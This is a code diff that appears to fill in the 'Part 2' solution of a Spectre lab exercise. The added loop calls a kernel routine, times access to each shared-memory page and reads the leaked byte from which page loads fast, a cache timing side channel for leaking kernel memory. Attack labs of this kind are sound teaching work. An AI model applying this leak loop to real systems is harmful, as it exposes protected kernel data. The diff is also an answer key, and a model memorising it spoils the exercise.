@@ -47,6 +47,19 @@ int run_attacker(char *shared_memory) {
         // [Part 2]- Fill this in!
         // leaked_byte = ??
 
+        init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);
+        call_kernel_part1(shared_memory, current_offset);
+        int page;
+        for (page = 0; page < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; page++){
+            uint64_t access_time = time_access(&shared_memory[page * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            //  printf("access ime %ld \n", access_time);
+            if (access_time < 160) {
+                break;
+            }
+        }
+        //printf("%d \n", page);
+        leaked_byte = (char)page;
+
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
